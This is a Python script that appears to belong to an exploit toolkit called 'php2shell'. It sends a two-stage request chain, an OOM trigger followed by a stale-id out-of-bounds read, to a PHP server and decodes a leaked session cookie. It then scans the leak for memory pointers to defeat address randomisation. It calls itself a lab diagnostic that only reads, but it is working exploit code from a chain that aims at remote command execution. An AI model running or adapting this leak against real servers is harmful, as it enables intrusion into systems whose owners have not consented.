#!/usr/bin/env python3
"""Seed-leak scan for the Plan B (var_destroy) chain on patched builds.

b1: is the CVE-2026-109619 Set-Cookie leak *fully* dead on a patched build,
    or does a weaker residual disclosure remain that the 87-pointer fire
    fingerprint would miss?

Runs the A1 (END-cleanup OOM) -> B1 (stale-id OOB read) producer pair and
decodes the Set-Cookie value, then scans the raw bytes for:
  * any canonical pointer-shaped qword (arm64 0xffff..., x86_64 0x7f...),
  * how many distinct 2 MiB buckets those pointers fall into,
  * the surviving-shape candidates (data[0]=&last_zval / d->last).

This is a lab-only diagnostic. It never fires zif_system; it only reads.
"""

from __future__ import annotations

import argparse
import struct
import sys
import time
import urllib.parse
from collections import Counter

from php2shell import amplify, pinning, probe


def _is_ptr_arm64(q: int) -> bool:
    return 0xFFFF000000000000 <= q <= 0xFFFFFFFFFFFFFFFF


def _is_ptr_x86(q: int) -> bool:
    return 0x7F0000000000 <= q <= 0x7FFFFFFFFFFF


def _decode_cookie(resp: bytes):
    i = resp.find(b"Set-Cookie: PHPSESSID=")
    if i < 0:
        return None, None
    val = resp[i + len("Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
    return val, urllib.parse.unquote_to_bytes(val.decode("latin-1"))


def scan(dec: bytes, arch: str):
    is_ptr = _is_ptr_arm64 if arch == "aarch64" else _is_ptr_x86
    ptrs = Counter()
    for off in range(0, len(dec) - 8, 8):
        q = struct.unpack_from("<Q", dec, off)[0]
        if is_ptr(q):
            ptrs[q] += 1
    buckets = Counter()
    for q, c in ptrs.items():
        buckets[q & ~0x1FFFFF] += c
    return ptrs, buckets


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:18131",
                    help="host:port of a lab target (default patched 8.4.27)")
    ap.add_argument("--arch", default="aarch64", choices=["aarch64", "x86_64"])
    ap.add_argument("--workers", type=int, default=1)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--save", default=None, help="write decoded cookie here")
    args = ap.parse_args()

    host, _, port = args.target.rpartition(":")
    port = int(port)

    with pinning.WorkerPinner(host, port, holders=max(0, args.workers - 1),
                              settle=0.8):
        try:
            probe.http_get(host, port, args.path, timeout=5, recv_timeout=5)
        except OSError:
            pass

        print(f"[*] A1: END-cleanup send_cookie OOM -> {args.target}")
        amplify.send_chunked(host, port, args.path + "?q0000000=v",
                             __import__("php2shell.remote", fromlist=["a1_body"]).a1_body(),
                             "multipart/form-data", boundary="C" * 10, timeout=180)
        time.sleep(0.2)

        print("[*] B1: stale-id OOB read")
        from php2shell import remote
        resp = amplify.send_chunked(host, port, args.path,
                                    remote.b1_body(spec=remote.LEAK_SPEC),
                                    "multipart/form-data", boundary="C" * 10,
                                    timeout=600)

    raw, dec = _decode_cookie(resp)
    if raw is None:
        print(f"[!] no Set-Cookie in {len(resp)}-byte response")
        print("    -> the B1 consumer never ran (or the leak path is gone)")
        return 1
    print(f"[*] Set-Cookie value: {len(raw)} B, decoded: {len(dec)} B")
    if args.save:
        with open(args.save, "wb") as fh:
            fh.write(dec)
        print(f"[*] wrote {args.save}")

    ptrs, buckets = scan(dec, args.arch)
    print(f"[*] pointer-shaped qwords: {sum(ptrs.values())} "
          f"({len(ptrs)} distinct)")
    if not ptrs:
        print("[!] ZERO pointers in the decoded window")
        print("    -> residual-leak hypothesis falsified for this build/stage")
        return 1

    print(f"[*] distinct 2 MiB buckets: {len(buckets)}")
    for b, c in buckets.most_common(8):
        print(f"      0x{b:016x}  n={c}")
    # page-aligned base candidates
    for q, c in ptrs.most_common(12):
        print(f"      ptr 0x{q:016x}  n={c}  page_off=0x{q & 0xFFF:x} "
              f"bucket=0x{q & ~0x1FFFFF:x}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
